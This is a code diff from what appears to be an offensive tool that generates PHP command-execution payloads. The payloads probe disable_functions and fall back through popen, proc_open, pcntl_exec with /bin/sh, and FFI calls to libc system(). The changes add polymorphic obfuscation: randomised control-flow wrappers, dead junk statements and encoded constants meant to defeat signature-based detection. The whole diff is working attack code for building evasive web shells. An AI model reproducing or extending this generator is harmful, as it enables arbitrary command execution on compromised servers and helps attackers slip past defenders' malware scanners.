@@ -55,47 +55,61 @@ func phpExecCmd(cmd string) string {
 	vFfi := phpVarName()
 
 	heavy := sdk.Shuffle([]string{
-		sdk.Sprintf(`if(%s){$%s=%s;$%s=%s;@$%s($%s($%s,%s));$%s=1;}`,
-			phpCond(r, d, "popen"), vPo, phpEncodeStr("popen"), vPc, phpEncodeStr("pclose"),
-			vPc, vPo, c, phpEncodeStr("r"), r),
-		sdk.Sprintf(`if(%s){$%s=%s;@$%s($%s,[[%s,%s],[%s,%s],[%s,%s]],$%s);$%s=1;}`,
-			phpCond(r, d, "proc_open"), vPr, phpEncodeStr("proc_open"),
-			vPr, c,
-			phpEncodeStr("pipe"), phpEncodeStr("r"),
-			phpEncodeStr("pipe"), phpEncodeStr("w"),
-			phpEncodeStr("pipe"), phpEncodeStr("w"),
-			p, r),
-		sdk.Sprintf(`if(%s){$%s=%s;@$%s(%s,[%s,$%s]);$%s=1;}`,
-			phpCond(r, d, "pcntl_exec"), vPe, phpEncodeStr("pcntl_exec"),
-			vPe, phpEncodeStr("/bin/sh"), phpEncodeStr("-c"), c, r),
+		phpIfWrap(phpCond(r, d, "popen"),
+			sdk.Sprintf(`$%s=%s;$%s=%s;@$%s($%s($%s,%s));$%s=%s;`,
+				vPo, phpEncodeStr("popen"), vPc, phpEncodeStr("pclose"),
+				vPc, vPo, c, phpEncodeStr("r"), r, phpOne())),
+		phpIfWrap(phpCond(r, d, "proc_open"),
+			sdk.Sprintf(`$%s=%s;@$%s($%s,[[%s,%s],[%s,%s],[%s,%s]],$%s);$%s=%s;`,
+				vPr, phpEncodeStr("proc_open"),
+				vPr, c,
+				phpEncodeStr("pipe"), phpEncodeStr("r"),
+				phpEncodeStr("pipe"), phpEncodeStr("w"),
+				phpEncodeStr("pipe"), phpEncodeStr("w"),
+				p, r, phpOne())),
+		phpIfWrap(phpCond(r, d, "pcntl_exec"),
+			sdk.Sprintf(`$%s=%s;@$%s(%s,[%s,$%s]);$%s=%s;`,
+				vPe, phpEncodeStr("pcntl_exec"),
+				vPe, phpEncodeStr("/bin/sh"), phpEncodeStr("-c"), c, r, phpOne())),
 		func() string {
 			vCd, vSy := phpVarName(), phpVarName()
-			return sdk.Sprintf(`if(!$%s){$%s=%s;if($%s(%s)){$%s=%s;$%s=%s;$%s=%s;@$%s::{$%s}(%s)->{$%s}($%s);$%s=1;}}`,
-				r, vFfi, phpEncodeStr("class_exists"),
-				vFfi, phpEncodeStr("FFI"), vFfi, phpEncodeStr("FFI"),
-				vCd, phpEncodeStr("cdef"),
-				vSy, phpEncodeStr("system"),
-				vFfi, vCd, phpEncodeStr("int system(const char *command);"),
-				vSy, c, r)
+			return phpIfWrap(sdk.Sprintf(`!$%s`, r),
+				sdk.Sprintf(`$%s=%s;`+phpIfWrap(sdk.Sprintf(`$%s(%s)`, vFfi, phpEncodeStr("FFI")),
+					sdk.Sprintf(`$%s=%s;$%s=%s;$%s=%s;@$%s::{$%s}(%s)->{$%s}($%s);$%s=%s;`,
+						vFfi, phpEncodeStr("FFI"),
+						vCd, phpEncodeStr("cdef"),
+						vSy, phpEncodeStr("system"),
+						vFfi, vCd, phpEncodeStr("int system(const char *command);"),
+						vSy, c, r, phpOne())),
+					vFfi, phpEncodeStr("class_exists")))
 		}(),
 	})
 
 	vIni := phpVarName()
 	vB64 := phpVarName()
 
-	return sdk.Sprintf(`%s;%s;%s;`+
+	j1, j2, j3 := phpMaybeJunk(), phpMaybeJunk(), phpMaybeJunk()
+
+	osCheck := phpIfWrap(
+		sdk.Sprintf(`(%s)(PHP_OS,%s)`, phpEncodeStr("stristr"), phpEncodeStr("win")),
+		sdk.Sprintf(`$%s.=" 2>&1\n";`, c))
+
+	foreachBody := phpIfWrapInner(guard,
+		sdk.Sprintf(`%s;$%s=%s;break;`, call, r, phpOne()))
+
+	return sdk.Sprintf(`%s;%s;%s;%s`+
 		`$%s=%s;$%s=%s;$%s=@$%s(%s);$%s=$%s('%s');`+
-		`if((%s)(PHP_OS,%s))$%s.=" 2>&1\n";`+
-		`$%s=0;`+
-		`foreach([%s,%s,%s,%s] as $%s){if(%s){%s;$%s=1;break;}}`+
-		`%s%s%s%s`,
-		preamble[0], preamble[1], preamble[2],
+		`%s`+
+		`$%s=%s;%s`+
+		`foreach([%s,%s,%s,%s] as $%s){%s}`+
+		`%s%s%s%s%s`,
+		preamble[0], preamble[1], preamble[2], j1,
 		vIni, phpEncodeStr("ini_get"), vB64, phpEncodeStr("base64_decode"),
 		d, vIni, phpEncodeStr("disable_functions"), c, vB64, b64,
-		phpEncodeStr("stristr"), phpEncodeStr("win"), c,
-		r,
-		encoded[0], encoded[1], encoded[2], encoded[3], f, guard, call, r,
-		heavy[0], heavy[1], heavy[2], heavy[3],
+		osCheck,
+		r, phpZero(), j2,
+		encoded[0], encoded[1], encoded[2], encoded[3], f, foreachBody,
+		j3, heavy[0], heavy[1], heavy[2], heavy[3],
 	)
 }
 
@@ -172,6 +186,95 @@ func phpNotDisabledVar(d, f string) string {
 	default:
 		return sdk.Sprintf(`false===(%s)($%s,$%s)`, stristr, d, f)
 	}
+}
+
+// --- Control flow mutation ---
+
+// phpIfWrap wraps "if(cond){body}" in a random control flow structure.
+func phpIfWrap(cond, body string) string {
+	switch sdk.RandInt(0, 3) {
+	case 0:
+		return sdk.Sprintf(`if(%s){%s}`, cond, body)
+	case 1:
+		return sdk.Sprintf(`while(%s){%s;break;}`, cond, body)
+	case 2:
+		return sdk.Sprintf(`for(;%s;){%s;break;}`, cond, body)
+	default:
+		return sdk.Sprintf(`do{if(!(%s))break;%s}while(0);`, cond, body)
+	}
+}
+
+// phpIfPrefix returns the opening of an if-like statement for inline use.
+func phpIfPrefix() string {
+	switch sdk.RandInt(0, 1) {
+	case 0:
+		return "if(("
+	default:
+		return "if(!!("
+	}
+}
+
+// phpIfWrapInner wraps condition+body inside a foreach iteration.
+func phpIfWrapInner(cond, body string) string {
+	switch sdk.RandInt(0, 2) {
+	case 0:
+		return sdk.Sprintf(`if(%s){%s}`, cond, body)
+	case 1:
+		return sdk.Sprintf(`if(!(%s))continue;%s`, cond, body)
+	default:
+		return sdk.Sprintf(`if(%s){%s}`, cond, body)
+	}
+}
+
+// phpZero returns a random expression that evaluates to 0.
+func phpZero() string {
+	switch sdk.RandInt(0, 3) {
+	case 0:
+		return "0"
+	case 1:
+		return "0|0"
+	case 2:
+		return sdk.Sprintf(`%s('')`, phpEncodeStr("intval"))
+	default:
+		return sdk.Sprintf(`%s('')`, phpEncodeStr("strlen"))
+	}
+}
+
+// phpOne returns a random expression that evaluates to 1.
+func phpOne() string {
+	switch sdk.RandInt(0, 2) {
+	case 0:
+		return "1"
+	case 1:
+		return "!!1"
+	default:
+		return sdk.Sprintf(`%s('1')`, phpEncodeStr("intval"))
+	}
+}
+
+// phpJunk returns a random dead code statement.
+func phpJunk() string {
+	v := phpVarName()
+	switch sdk.RandInt(0, 4) {
+	case 0:
+		return sdk.Sprintf(`$%s=%s(%s)`, v, phpEncodeStr("str_repeat"), phpEncodeStr(sdk.RandAlpha(1)))
+	case 1:
+		return sdk.Sprintf(`$%s=%s()`, v, phpEncodeStr("time"))
+	case 2:
+		return sdk.Sprintf(`$%s=%s(0,%s)`, v, phpEncodeStr("str_pad"), phpEncodeStr(sdk.RandAlpha(1)))
+	case 3:
+		return sdk.Sprintf(`$%s=%s(%s)`, v, phpEncodeStr("md5"), phpEncodeStr(sdk.RandAlpha(4)))
+	default:
+		return sdk.Sprintf(`$%s=%s()`, v, phpEncodeStr("microtime"))
+	}
+}
+
+// phpMaybeJunk returns junk code with a separator, or empty string.
+func phpMaybeJunk() string {
+	if sdk.RandBool() {
+		return phpJunk() + ";"
+	}
+	return ""
 }
 
 // --- String encoding (polymorphic) ---
